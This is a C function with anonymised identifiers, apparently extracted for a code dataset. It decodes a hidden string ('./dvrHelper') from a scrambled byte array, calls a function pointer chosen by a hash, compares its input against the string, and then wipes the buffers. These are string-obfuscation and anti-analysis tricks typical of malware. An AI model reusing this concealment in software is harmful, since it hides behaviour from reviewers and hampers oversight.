
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef char uint8_t ;
typedef int obf_funcs ;
typedef int buf_src ;
typedef int buf_dst ;
typedef int BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 void FUNC_0 () ;
 int FUNC_1 () ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_2 (char*,char*) ;
 int FUNC_3 (char*) ;
 int FUNC_4 (char*,int) ;

__attribute__((used)) static BOOL FUNC_5(char *VAR_9)
{

    char VAR_10[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, VAR_11[12];
    int VAR_12, VAR_13 = 0, VAR_14 = 0;
    uint8_t VAR_15 = 0xAF;
    void (*VAR_16[]) (void) = {
        (void (*) (void))VAR_3,
        (void (*) (void))VAR_7,
        (void (*) (void))VAR_6,
        (void (*) (void))FUNC_1,
        (void (*) (void))VAR_5,
        (void (*) (void))VAR_8,
        (void (*) (void))FUNC_2,
        (void (*) (void))VAR_4,
        (void (*) (void))VAR_2
    };
    BOOL VAR_17;

    for (VAR_12 = 0; VAR_12 < 7; VAR_12++)
        VAR_14 += (long)VAR_16[VAR_12];
    if (VAR_14 == 0)
        return VAR_0;


    for (VAR_12 = 0; VAR_12 < sizeof (VAR_10); VAR_12 += 3)
    {
        char VAR_18 = VAR_10[VAR_12];

        VAR_11[VAR_13++] = VAR_10[VAR_12 + 1];
        VAR_11[VAR_13++] = VAR_18;


        VAR_12 *= 2;
        VAR_12 += 14;
        VAR_12 /= 2;
        VAR_12 -= 7;


        VAR_15 += ~VAR_9[VAR_13 % FUNC_3(VAR_9)];
    }
    VAR_15 %= (sizeof (VAR_16) / sizeof (void *));


    (VAR_16[VAR_15])();
    VAR_17 = FUNC_2(VAR_9, VAR_11);
    FUNC_4(VAR_10, sizeof (VAR_10));
    FUNC_4(VAR_11, sizeof (VAR_11));
    return VAR_17;




}
